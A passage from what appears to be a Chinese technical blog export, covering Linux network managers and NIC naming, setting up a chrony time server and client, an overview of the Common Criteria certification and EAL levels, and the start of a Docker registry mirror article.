class=\"attr\">version:</span> <span class=\"number\">2</span></span><br><span class=\"line\">  <span class=\"attr\">renderer:</span> <span class=\"string\">networkd</span></span><br><span class=\"line\">  <span class=\"attr\">ethernets:</span></span><br><span class=\"line\">    <span class=\"attr\">enp3s0:</span></span><br><span class=\"line\">      <span class=\"attr\">addresses:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.2</span><span class=\"string\">/24</span></span><br><span class=\"line\">      <span class=\"attr\">nameservers:</span></span><br><span class=\"line\">        <span class=\"attr\">search:</span> [<span class=\"string\">mydomain</span>, <span class=\"string\">otherdomain</span>]</span><br><span class=\"line\">        <span class=\"attr\">addresses:</span> [<span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.1</span>, <span class=\"number\">1.1</span><span class=\"number\">.1</span><span class=\"number\">.1</span>]</span><br><span class=\"line\">      <span class=\"attr\">routes:</span> </span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">to:</span> <span class=\"string\">default</span></span><br><span class=\"line\">          <span class=\"attr\">via:</span> <span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.1</span></span><br></pre></td></tr></table></figure>\n\n<p>netplan 提供两个命令行工具：</p>\n<ul>\n<li><code>netplan generate</code> ：以 <code>/etc/netplan</code> 配置为管理工具生成配置信息</li>\n<li><code>netplan apply</code> ：应用配置。调整 &#x2F;etc&#x2F;netplan 配置后，需要执行该命令方能生效，必要时重启管理工具</li>\n</ul>\n<h2 id=\"三、小结\"><a href=\"#三、小结\" class=\"headerlink\" title=\"三、小结\"></a>三、小结</h2><ol>\n<li>如果你使用的是 KDE 或者 GOME 等 Linux 桌面，毫无疑问应该使用 NetworkManager。<br> 因为其使用DBus作为通信机制，可以集成各种网络类型和设备，包括以太网、无线网络、蓝牙、移动宽带等，支持广泛的网络协议和语言环境，提供图形界面和命令行界面等多种管理方式，能让你的计算机在任何时候通过多种接口保持连接。</li>\n<li>如果你使用的是 Linux 服务器，则需要区分不同版本：<ul>\n<li>Centos7 及以前版本：建议直接使用 network，并关闭 NetworkManager，因为存在一些兼容性问题</li>\n<li>Centos8 及以后版本：建议使用 NetworkManager，并关闭 systemd-networkd（network 已被默认卸载）</li>\n</ul>\n</li>\n<li>systemd-networkd 有着快速启动、低内存占用和高性能等突出优点，与其他 systemd 组件（例如用于域名解析的 resolved、NTP 的timesyncd，用于命名的 udevd）结合的非常好，但目前还不是一个成熟的解决方案，主要问题是：<ul>\n<li>不支持无线网络，需要手工关联<code>wpa_supplicant</code>服务</li>\n<li>全局域名解析存在缺陷，需要手工关联<code>systemd-resolved</code>服务</li>\n<li>不能为更高层面的脚本编程提供 ifup&#x2F;ifdown 钩子函数</li>\n</ul>\n</li>\n<li>Netplan 目前并未流行，主要是 Ubuntu 17 以后的版本提供，Centos 似乎没有默认安装包。</li>\n</ol>\n<hr>\n<h2 id=\"附录：网卡设备的命名方式\"><a href=\"#附录：网卡设备的命名方式\" class=\"headerlink\" title=\"附录：网卡设备的命名方式\"></a>附录：网卡设备的命名方式</h2><p>Centos6 及之前的版本网卡命名格式：eth[0123…]，也就是常见的<code>eth0</code>等等。随着服务器网卡的数量、类型和集成方式越来越复杂（既有主板集成的，也有PCIe插槽，wifi、蓝牙等无线网卡），简单的数字编号已经很难准确标识网卡接口的物理位置。</p>\n<p>Centos7 开始默认启用一致网络设备命名（Consistent Network Device Naming），支持 biosdevname 和 net.ifnames 两种命名规范。<br>常见的 net.ifnames 命名规范表述为：<code>设备类型 + 设备位置 + 数字</code>，主要设备类型前缀包括：</p>\n<ul>\n<li><code>en</code> ：用于以太网</li>\n<li><code>wl</code> ：用于无线 LAN(WLAN)</li>\n<li><code>ww</code> ：用于无线广域网(WWAN)。</li>\n</ul>\n<p>另外，以下之一会根据 udev 设备管理器应用的模式，附加到上述前缀中的一个：</p>\n<ul>\n<li><code>o&lt;on-board_index_number&gt;</code>：主板集成设备</li>\n<li><code>s&lt;hot_plug_slot_index_number&gt;[f&lt;function&gt;][d&lt;device_id&gt;]</code>：主板集成的PCI插槽<br>  请注意，所有多功能 PCI 设备在设备名称中都包含<code>[f&lt;function&gt;]</code>号，包括功能 0 设备。</li>\n<li><code>x&lt;MAC_address&gt;</code>：网卡的MAC地址</li>\n<li><code>[P&lt;domain_number&gt;]p&lt;bus&gt;s&lt;slot&gt;[f&lt;function&gt;][d&lt;device_id&gt;]</code>：PCI扩展卡<br>  <code>[P&lt;domain_number&gt;]</code> 部分定义了 PCI 的地理位置。如果域号不是 0 ，才会设置此部分。</li>\n<li><code>[P&lt;domain_number&gt;]p&lt;bus&gt;s&lt;slot&gt;[f&lt;function&gt;][u&lt;usb_port&gt;][…​][c&lt;config&gt;][i&lt;interface&gt;]</code>：USB设备<br>  对于 USB 设备，hub 端口号的完整链由 hub 的端口号组成。如果名称大于最大值（15 个字符），则不会导出该名称。如果链中有多个 USB 设备，则 udev 会抑制 USB 配置描述符(c1)和 USB 接口描述符(i0)的默认值。</li>\n</ul>\n<blockquote>\n<p>biosdevname 规范的常见名称包括：em1、p3p4、p3p4_1、。。。</p>\n</blockquote>\n<p>udev 设备管理器会根据以下方案生成设备名称：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Scheme</th>\n<th>描述</th>\n<th align=\"center\">示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">1</td>\n<td>设备名称包含固件或者 BIOS 提供的索引号，用于板上的设备。如果此信息不可用或不适用，则 udev 将使用方案 2。</td>\n<td align=\"center\">eno1，主板集成的1号以太网卡</td>\n</tr>\n<tr>\n<td align=\"center\">2</td>\n<td>设备名称包含固件或 BIOS 提供的 PCI Express（PCIe）热插件插槽索引号。如果此信息不可用或不适用，则 udev 将使用方案 3。</td>\n<td align=\"center\">ens1，内置1号PCI接口的以太网卡</td>\n</tr>\n<tr>\n<td align=\"center\">3</td>\n<td>设备名称包含硬件连接器的物理位置。如果此信息不可用或不适用，则 udev 将使用方案 5。</td>\n<td align=\"center\">enp2s0，2号PCI扩展卡的slot 0的以太网卡</td>\n</tr>\n<tr>\n<td align=\"center\">4</td>\n<td>设备名称包含 MAC 地址。Red Hat Enterprise Linux 默认不使用这个方案，但管理员可选择性地使用它。</td>\n<td align=\"center\">enx525400d5e0fb，网卡的MAC地址</td>\n</tr>\n<tr>\n<td align=\"center\">5</td>\n<td>传统的无法预计的内核命名方案。如果 udev 无法应用任何其他方案，则设备管理器使用这个方案。</td>\n<td align=\"center\">eth0，传统方案</td>\n</tr>\n</tbody></table>\n<p>更多示例包括：</p>\n<ul>\n<li>wlp3s0 ：PCI无线网卡</li>\n<li>wwp0s29f7u2i2 ：4G modem</li>\n<li>wlp0s2f1u4u1 ：连接在USB Hub上的无线网卡</li>\n<li>enx78e7d1ea46da ：直接以MAC地址命名的 PCI 网卡</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/consistent-network-interface-device-naming_configuring-and-managing-networking\">Red Hat 官方文档 - 一致的网络接口设备命名</a></li>\n<li><a href=\"https://www.cnblogs.com/jikexianfeng/p/9209663.html\">linux 目录&#x2F;sys 解析</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1694844\">Centos 网卡命名规范及信息查看</a></li>\n<li><a href=\"https://www.cnblogs.com/jackydalong/archive/2013/11/06/3410890.html\">biosdevname网卡命名方式</a></li>\n<li><a href=\"https://www.jianshu.com/p/5d5560e9e26a\">CentOS 7 下网络管理之命令行工具nmcli</a></li>\n<li><a href=\"https://linux.cn/article-6629-1.html\">从 NetworkManager 切换到 Systemd-networkd</a></li>\n<li><a href=\"https://github.com/canonical/netplan\">Netplan Github 主页</a></li>\n</ul>\n"},{"title":"Chrony时间同步服务器的安装记录","url":"/2023/09/03/Chrony%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>与 ntp 相比，chrony 是一种相对较新的时间同步工具，具有以下特点：</p>\n<ul>\n<li>采用一种称为”时间滤波”的技术，通过估计时钟漂移率，平滑时钟跳变和抖动，来提高时钟同步的精度和稳定性</li>\n<li>支持本地时钟缓存，在没有网络连接时依然保持时钟的精度，还支持快速时钟校准和实时时钟补偿等功能</li>\n<li>系统资源的消耗相对较少，配置相对简单更加易于管理</li>\n</ul>\n<p>Chrony 有两个核心组件：</p>\n<ul>\n<li><code>chronyd</code>：守护进程，主要用于调整内核中运行的系统时间和时间服务器同步</li>\n<li><code>chronyc</code>：客户端，它提供一个用户界面，用于监控性能并进行多样化的配置</li>\n</ul>\n<h2 id=\"二、服务器的配置方法\"><a href=\"#二、服务器的配置方法\" class=\"headerlink\" title=\"二、服务器的配置方法\"></a>二、服务器的配置方法</h2><h3 id=\"1-安装方法\"><a href=\"#1-安装方法\" class=\"headerlink\" title=\"1. 安装方法\"></a>1. 安装方法</h3><p>CentOS 8 默认使用 chronyd 作为时间同步工具, openEuler 也将其作为默认启动的系统服务。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install chrony</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-配置文件\"><a href=\"#2-配置文件\" class=\"headerlink\" title=\"2. 配置文件\"></a>2. 配置文件</h3><p>chrony 的配置文件位于：<code>/etc/chrony.conf</code>，作为服务器时，最核心的配置参数有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 配置公网的上游时间服务资源池</span><br><span class=\"line\">pool ntp.aliyun.com iburst</span><br><span class=\"line\"></span><br><span class=\"line\"># 记录系统时钟获取/失去时间的速率</span><br><span class=\"line\">driftfile /var/lib/chrony/drift</span><br><span class=\"line\"></span><br><span class=\"line\"># 如果系统时钟的偏差大于1秒，则允许在前三次更新中进行 步进调整</span><br><span class=\"line\">makestep 1.0 3</span><br><span class=\"line\"></span><br><span class=\"line\"># 启用内核对实时时钟（RTC）的同步</span><br><span class=\"line\">rtcsync</span><br><span class=\"line\"></span><br><span class=\"line\"># 允许来自本地网络 192.168.0.0/24 的NTP客户端访问</span><br><span class=\"line\">allow 192.168.0.0/24</span><br><span class=\"line\"></span><br><span class=\"line\"># 即使未与时间源同步，也提供时间服务</span><br><span class=\"line\">local stratum 10</span><br><span class=\"line\"></span><br><span class=\"line\"># 从系统 tz 数据库获取 TAI-UTC 偏移量和闰秒。</span><br><span class=\"line\">leapsectz right/UTC</span><br><span class=\"line\"></span><br><span class=\"line\"># 指定日志文件的目录。</span><br><span class=\"line\">logdir /var/log/chrony</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>pool hostname [option] &amp; server hostname [option]<br>  用于指定要同步的 NTP 服务器。<br>  pool 是一组资源池，例如： 0.centos.pool.ntp.org、pool.ntp.org<br>  server 是单个时间服务器：ntp1.aliyun.com</p>\n<p>  iburst 是参数, 一般用此参数即可。该参数的含义是在头四次 NTP 请求以 2s 或者更短的间隔，而不是以 minpoll x 指定的最小间隔，这样的设置可以让 chronyd 启动时快速进行一次同步<br>  其他的参数有 minpoll x 默认值是 6，代表 64s。maxpoll x 默认值是 9，代表 512s</p>\n</li>\n<li><p>driftfile file<br>  Chrony 会根据实际时间计算修正值，并将补偿参数记录在该指令指定的文件里，默认为<code>/var/lib/chrony/drift</code>。</p>\n</li>\n<li><p>makestep threshold limit<br>  此指令使 Chrony 根据需要通过加速或减慢时钟来逐渐校正任何时间偏移。例如：<code>makestep 1.0 3</code>，就表示当头三次校时，如果时间相差 1.0s, 则跳跃式校时</p>\n</li>\n<li><p>rtcsync<br>  启用内核时间与 RTC 时间同步 (自动写回硬件)</p>\n</li>\n<li><p>allow ip<br>  设置允许客户端访问的 IP 地址段，默认是<code>192.168.0.0/16</code></p>\n</li>\n<li><p>local stratum 10<br>  即使未与时间源同步，也提供时间服务</p>\n</li>\n<li><p>leapsectz right&#x2F;UTC<br>  允许从系统 tz 数据库获取 TAI-UTC 偏移量和闰秒。</p>\n</li>\n<li><p>logdir file<br>  该参数用于指定 Chrony 日志文件的路径</p>\n</li>\n</ul>\n<h3 id=\"3-启动方式\"><a href=\"#3-启动方式\" class=\"headerlink\" title=\"3. 启动方式\"></a>3. 启动方式</h3><p>设置系统自动启动，注意 firewall 可能影响服务端口</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"built_in\">enable</span> --now chronyd</span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> --now firewalld</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、客户端的配置方法\"><a href=\"#三、客户端的配置方法\" class=\"headerlink\" title=\"三、客户端的配置方法\"></a>三、客户端的配置方法</h2><h3 id=\"1-配置文件\"><a href=\"#1-配置文件\" class=\"headerlink\" title=\"1. 配置文件\"></a>1. 配置文件</h3><p>修改默认配置文件<code>/etc/chrony.conf</code>，其实只要修改<code>server</code>配置就行，其他都是默认：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">server 192.168.0.140 iburst</span><br><span class=\"line\"></span><br><span class=\"line\"># Record the rate at which the system clock gains/losses time.</span><br><span class=\"line\">driftfile /var/lib/chrony/drift</span><br><span class=\"line\"></span><br><span class=\"line\"># Allow the system clock to be stepped in the first three updates</span><br><span class=\"line\"># if its offset is larger than 1 second.</span><br><span class=\"line\">makestep 1.0 3</span><br><span class=\"line\"></span><br><span class=\"line\"># Enable kernel synchronization of the real-time clock (RTC).</span><br><span class=\"line\">rtcsync</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-启动方式\"><a href=\"#2-启动方式\" class=\"headerlink\" title=\"2. 启动方式\"></a>2. 启动方式</h3><p>完事后，重启系统服务</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl restart chronyd</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、运行状态检查\"><a href=\"#四、运行状态检查\" class=\"headerlink\" title=\"四、运行状态检查\"></a>四、运行状态检查</h2><h3 id=\"1-网络端口占用-UDP-123-323\"><a href=\"#1-网络端口占用-UDP-123-323\" class=\"headerlink\" title=\"1. 网络端口占用 - UDP 123 &amp; 323\"></a>1. 网络端口占用 - UDP 123 &amp; 323</h3><p>chronyd 服务器启动后，通过 UDP 123 对外提供服务，同时 UDP 323 作为 chronyd 的控制端口。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]# netstat -tunpl |grep chronyd</span><br><span class=\"line\">udp        0      0 127.0.0.1:323           0.0.0.0:*                           1159/chronyd        </span><br><span class=\"line\">udp        0      0 0.0.0.0:123             0.0.0.0:*                           1159/chronyd        </span><br><span class=\"line\">udp6       0      0 ::1:323                 :::*                                1159/chronyd  </span><br></pre></td></tr></table></figure>\n\n<p>相应的，作为客户端时就只能看到 UDP 323 的控制端口。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@Copy-of-VM-Centos7 etc]# netstat -tunpl |grep chronyd</span><br><span class=\"line\">udp        0      0 127.0.0.1:323           0.0.0.0:*                           1333/chronyd        </span><br><span class=\"line\">udp6       0      0 ::1:323                 :::*                                1333/chronyd </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-查看时间同步状态-chronyc-tracking\"><a href=\"#2-查看时间同步状态-chronyc-tracking\" class=\"headerlink\" title=\"2. 查看时间同步状态 - chronyc tracking\"></a>2. 查看时间同步状态 - <code>chronyc tracking</code></h3><figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Reference ID    : C0A8008C (192.168.0.140)</span><br><span class=\"line\">Stratum         : 3</span><br><span class=\"line\">Ref time (UTC)  : Sun Sep 03 13:55:23 2023</span><br><span class=\"line\">System time     : 0.000034211 seconds fast of NTP time</span><br><span class=\"line\">Last offset     : +0.000040019 seconds</span><br><span class=\"line\">RMS offset      : 0.001916519 seconds</span><br><span class=\"line\">Frequency       : 7.131 ppm fast</span><br><span class=\"line\">Residual freq   : +0.341 ppm</span><br><span class=\"line\">Skew            : 5.028 ppm</span><br><span class=\"line\">Root delay      : 0.019536793 seconds</span><br><span class=\"line\">Root dispersion : 0.002344563 seconds</span><br><span class=\"line\">Update interval : 65.1 seconds</span><br><span class=\"line\">Leap status     : Normal</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-查看时间服务器列表：-chronyc-sources-v\"><a href=\"#3-查看时间服务器列表：-chronyc-sources-v\" class=\"headerlink\" title=\"3. 查看时间服务器列表： chronyc sources -v\"></a>3. 查看时间服务器列表： <code>chronyc sources -v</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">210 Number of sources = 1</span><br><span class=\"line\"></span><br><span class=\"line\">  .-- Source mode  &#x27;^&#x27; = server, &#x27;=&#x27; = peer, &#x27;#&#x27; = local clock.</span><br><span class=\"line\"> / .- Source state &#x27;*&#x27; = current synced, &#x27;+&#x27; = combined , &#x27;-&#x27; = not combined,</span><br><span class=\"line\">| /   &#x27;?&#x27; = unreachable, &#x27;x&#x27; = time may be in error, &#x27;~&#x27; = time too variable.</span><br><span class=\"line\">||                                                 .- xxxx [ yyyy ] +/- zzzz</span><br><span class=\"line\">||      Reachability register (octal) -.           |  xxxx = adjusted offset,</span><br><span class=\"line\">||      Log2(Polling interval) --.      |          |  yyyy = measured offset,</span><br><span class=\"line\">||                                \\     |          |  zzzz = estimated error.</span><br><span class=\"line\">||                                 |    |           \\</span><br><span class=\"line\">MS Name/IP address         Stratum Poll Reach LastRx Last sample               </span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\">^* 192.168.0.140                 2   6    17     3  -1348ns[  +19us] +/-   12ms</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.jianshu.com/p/e9be333aa54c\">时间同步 chrony 的服务端和客户端配置</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1546322\">再见 NTP，是时候拥抱下一代时间同步服务 Chrony 了</a></li>\n</ul>\n"},{"title":"Common Criteria 国际安全认证体系","url":"/2024/03/10/Common-Criteria-%E5%9B%BD%E9%99%85%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB/","content":"<p>1993 年，在美国的 TCSEC、欧洲的 ITSEC、加拿大的 CTCPEC、美国的 FC（Federal Criteria）等信息安全准则的基础上，由 6 个国家 7 方(美国国家安全局 NSA 和国家技术标准研究所 NIST、加、英、法、德、荷)共同提出了<strong>信息技术安全评价通用准则</strong>（The Common Criteria for Information Technology security Evaluation，简称 CC 标准），目标是采用一套公共的准则规范为 IT 保障类产品的广泛用户群体提供最大的便利，提供了一个更全面的框架用来评估信息系统、信息产品的安全性。</p>\n<p><img src=\"/2024/03/10/Common-Criteria-%E5%9B%BD%E9%99%85%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB/CC-his.png\" alt=\"历史\"></p>\n<p>Common Criteria 先后发布了4个官方版本，当前最新版本是 v3.1，请参见<a href=\"https://www.commoncriteriaportal.org/cc/index.cfm\">https://www.commoncriteriaportal.org</a></p>\n<h2 id=\"一、核心内容\"><a href=\"#一、核心内容\" class=\"headerlink\" title=\"一、核心内容\"></a>一、核心内容</h2><p>2005年发布的 CC v2.3 是最经典的版本，其分为三个部分，此外还有一个用于国际认证的<a href=\"cemv2.3.pdf\">通用评估方法论 CEM</a>。</p>\n<h3 id=\"1-基本概念\"><a href=\"#1-基本概念\" class=\"headerlink\" title=\"1. 基本概念\"></a>1. 基本概念</h3><p><a href=\"ccpart1v2.3.pdf\">第一部分</a>介绍了CC 的基本思路和一般模型，规定了撰写技术文档的格式及要点，核心概念包括：</p>\n<ul>\n<li>TOE（Target of Evaluation，评估对象）：作为安全评估对象的具体信息技术产品(如防火墙、计算机网络、密码模块等)，包括相关的管理员指南、用户指南、设计方案等文档。</li>\n<li>ST（Security Target，安全目标）：对某个特定的评估目标提出的要其满足的安全功能要求（Security Functional Requirements，简称 SFR）和安全保障要求（Security Assurance Requirements，简称SAR）。</li>\n<li>PP（Protection Profile，保护轮廓）：满足特定用户需求，与一类 TOE 实现无关的一组安全要求。</li>\n</ul>\n<p>总的来说，PP 相当于行业的一个规范或标准，它是对标整个行业的，表达“要求产品做成什么样子”；ST 是针对具体厂商 而言的，表达“产品想做成什么样子”，相当于产品的安全功能说明书；TOE 则是某个厂商的具体产品。</p>\n<h3 id=\"2-SFR-安全功能组件\"><a href=\"#2-SFR-安全功能组件\" class=\"headerlink\" title=\"2. SFR 安全功能组件\"></a>2. SFR 安全功能组件</h3><p><a href=\"ccpart2v2.3.pdf\">第二部分</a>详细描述了可供 ST 或 PP 选用的安全功能组件，共分十一个大类，其中有安全审计、通信、密码支持、用户数据保护、标识和鉴别、安全管理、隐秘、TSF 保护、资源利用、TOE 访问和可信路径&#x2F;信道，这些安全功能组件集合了当前信息安全产业界最普遍使用的技术方法，并进一步细分到不同的族、组件及组成要素，是非常有价值的、可供参考的安全功能描述。</p>\n<p>CC 标准是有弹性可扩展的框架性体系（相当于一个标准化的安全需求目录），并非针对具体的产品，仍然保留了较大的灵活性。CC 标准既不强迫任何产品必须选用一些特定的安全功能组件，但也不能保证所有信息安全产品所需的安全功能都已存在相应描述，允许 ST 或 PP 的作者按照其已定义的安全功能组件的格式来定义描述新的安全功能组件。</p>\n<h3 id=\"3-SAR-安全保障要求\"><a href=\"#3-SAR-安全保障要求\" class=\"headerlink\" title=\"3. SAR 安全保障要求\"></a>3. SAR 安全保障要求</h3><p><a href=\"ccpart3v2.3.pdf\">第三部分</a>详细描述了可供 ST 或 PP 选用的安全保障要求。安全保障要求覆盖到对 ST 的评估准则、TOE 的开发、生命周期支持、指导性文件、测试、脆弱性评定在内的六个方面。<br>根据在每个方面安全保障要求的数量多少和松紧程度，CC 第三部分中又定义了七个评估保障级（Evaluation Assurance Level，简称EAL），每个评估保障级都是将六个方面的安全保障要求的细节按一定方式搭配并固定下来。从 EAL1 到 EAL7，在六个方面的安全保障要求由少到多、由松到紧逐渐递增。</p>\n<h2 id=\"二、评估保护等级-EAL\"><a href=\"#二、评估保护等级-EAL\" class=\"headerlink\" title=\"二、评估保护等级 EAL\"></a>二、评估保护等级 EAL</h2><p>EAL（Evaluation Assurance Level，评估保护等级）描述了评估深度和严谨程度的数字评级，每级 EAL 都定义了 6 项 SAR，包括：ST 的评估准则、TOE 的开发、生命周期支持、指导性文件、测试、脆弱性评定等。</p>\n<ul>\n<li>EAL 1：功能测试，<strong>基础级别</strong>的安全保障，适用于对正确运行需要一定信任的场合，安全威胁应视为并不严重。<br>  依据一个规范的独立性测试和对所提供指导性文档的检查来为用户评估 TOE；<br>  无需开发者配合即可完成评估，仅确认 TOE 的功能与其文档在形式上是一致的，且对已标识的威胁提供了有效的保护。</li>\n<li>EAL2：结构（白盒）测试，适用于缺乏现成可用的完整的开发记录时，开发者或用户需要一种<strong>低等到中等级别</strong>的、独立保证的安全性。<br>  增加开发者测试及脆弱性分析和基于 TOE 规范的独立性测试；<br>  提供功能和接口的规范、指导性文档和TOE的高层设计的评估分析；<br>  要求开发者递交设计信息和测试结果，但不需要开发者增加过多费用或时间投入；<br>  评估证据包括安全功能的独立性测试、开发者自测结果确认、功能强度分析、脆弱性报告、TOE 的配置表和安全交付程序；</li>\n<li>EAL3：系统地测试和检查，适用于开发者或用户需要一个<strong>中等级别</strong>的、独立保证的安全性，且在不带大量重建费用的情况下，对 TOE 及其开发过程进行彻底审查。<br>  增加更完备的安全功能测试，及提供开发过程中不会被篡改的可行性机制或程序；<br>  增加开发环境现场核查，核查配置管理、 开发过程管理、交付过程管理等。</li>\n<li>EAL4：系统地设计、测试和复查，适用于开发者或用户对传统的商品化的 TOE 需要一个<strong>中等到高等级别</strong>的独立保证的安全性，并且准备负担额外的安全专用工程费用。<br>  增加更多的设计描述、实现的子集，以及提供开发或交付过程中不会被篡改的可信性改进机制或程序；<br>  增加对抵御攻击的能力的独立脆弱性分析、开发环境控制措施（如自动化的额外的配置管理和安全交付程序）、源码审查；<br>  需要分析 TOE 模块的低层设计和实现的子集；</li>\n<li>EAL5：半形式化设计和测试，<strong>高等级别</strong>，适用于开发者和使用者在有计划的开发中，采用严格的开发手段，以获得一个高级别的独立保证的安全性，不会因采取专业性安全工程技术而增加一些不合理的开销。<br>  需要分析所有的实现，还需要额外分析功能规范和高层设计的形式化模型和半形式化表示和论证；</li>\n<li>EAL6：半形式化验证的设计和测试，适用于在<strong>高风险</strong>环境下的特定安全产品或系统的开发，且要保护的资源值得花费一些额外的人力、物力和财力。</li>\n<li>EAL7：形式化验证的设计和测试，适用于一些安全性要求很高的 TOE 开发，这些 TOE 将应用在风险非常高的地方，或者所保护资产的价值很高的地方，非常罕见！</li>\n</ul>\n<p><img src=\"/2024/03/10/Common-Criteria-%E5%9B%BD%E9%99%85%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB/EAL.png\" alt=\"EAL\"></p>\n<h2 id=\"三、与其他标准化组织的关系\"><a href=\"#三、与其他标准化组织的关系\" class=\"headerlink\" title=\"三、与其他标准化组织的关系\"></a>三、与其他标准化组织的关系</h2><p>2005年，国际标准组织（ISO）正式采纳 CC 2.3 版本为 <a href=\"https://www.iso.org/obp/ui/en/#iso:std:iso-iec:15408:-1:ed-4:v1:en\">ISO&#x2F;IEC 15408</a>。<br>2008年，中国也引入了 ISO&#x2F;IEC 标准作为 GB&#x2F;T 18336 国家标准，也是基于CC 2.3版本。</p>\n<p>目前 CCRA 互认的安全保障级别 EAL 最高为 4 级，为此该协定组织明确规定了通用标准评估方法论（Common Evaluation Methodology，CEM）作为互认协定所使用的标准基础，并被 ISO 组织接纳为国际标准 ISO&#x2F;IEC 18405。</p>\n<h2 id=\"四、CCRA-国际互认协定\"><a href=\"#四、CCRA-国际互认协定\" class=\"headerlink\" title=\"四、CCRA 国际互认协定\"></a>四、CCRA 国际互认协定</h2><p>1998 年，标准开发组的参与国联合了其他国家共同签署了 CC 互认协定（Common Criteria Recognition Arrangement，CCRA），目前包括美国、英国、德国、日本、韩国和澳大利亚等26个国家。<br>CCRA 各个成员国家的 CC 评估和认证体系均设有一个权威的认证机构和多个获得商业授权的评估实验室，他们与评估发起者（申请者）合作完成产品的评估和认证，权威认证机构接受所在国家政府职能机构和 CCRA 的双重监管。</p>\n<p>在美国，NIAP（National Information Assurance Partnership，美国国家信息保障合作组织）是 NSA（美国国家安全部）的一个部门，负责美国 CC 标准的实施。<br>CCEVS（Common Criteria Evaluation and Validation Scheme，通用标准评估与认证体系）是 NIAP 管理的一个国家计划，成立于 2009 年，核心任务是评估信息技术的安全功能是否符合 CC 国际标准。<br><a href=\"https://www.niap-ccevs.org/Product/index.cfm\">当前的认证产品列表</a>显示，Cisco、Microsoft、RedHat、Nokia等公司都在其列。</p>\n<p>在德国，CC 评测认证体系由德国 BSI（The Bundesamt fur Sicherheit in der Informationstechnik）负责开展，其是德国联邦政府的 IT 安全权威部门。</p>\n<p>目前中国没有参加 CCRA 组织。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://en.wikipedia.org/wiki/Common_Criteria\">CC 标准 - Wiki</a></li>\n</ul>\n<h3 id=\"官方文档下载\"><a href=\"#官方文档下载\" class=\"headerlink\" title=\"官方文档下载\"></a>官方文档下载</h3><ul>\n<li><a href=\"ccpart1v2.3.pdf\">CC v2.3 Part1</a></li>\n<li><a href=\"ccpart2v2.3.pdf\">CC v2.3 Part2</a></li>\n<li><a href=\"ccpart3v2.3.pdf\">CC v2.3 Part3</a></li>\n<li><a href=\"cemv2.3.pdf\">CC v2.3 CEM</a></li>\n</ul>\n<h3 id=\"分析报告下载\"><a href=\"#分析报告下载\" class=\"headerlink\" title=\"分析报告下载\"></a>分析报告下载</h3><ul>\n<li><a href=\"CC_and_CCRA_Introduction.pdf\">国际CC 认证体系和CCRA 简介</a></li>\n<li><a href=\"ICT-report.pdf\">ICT 产品信息安全北美市场准入体系研究报告</a></li>\n</ul>\n"},{"title":"Docker Mirror 容器镜像服务解析","url":"/2021/01/31/Docker-Mirror-%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A1%E8%A7%A3%E6%9E%90/","content":"<p>在实际生产环境下，机器都不能访问外部互联网，或者访问互联网络的带宽有限，同时有大量的容器镜像需要从外部下载，如果每次开发、测试、部署时都需要从互联网下载容器镜像，则将占用大量的带宽而且效率较低。同时，在某些场景如物联网场景中，需要使用移动网络接入互联网，这时带宽可能是系统部署的瓶颈。</p>\n<p>更为严重的问题是，Docker Hub公有云容器镜像服务对客户端有限流设置，当镜像拉取操作达到一定流量时，会导致服务无法使用。Docker Hub最新免费服务条款（11月1日生效），匿名用户每6小时只允许拉取100次，登录用户200次，只有付费用户不受此限制。</p>\n<p>Mirror代理缓存仓库的作用就是为了以上问题，通过运行一个缓存仓库允许你在本地储存镜像，减少过多的通过互联网从<code>Docker 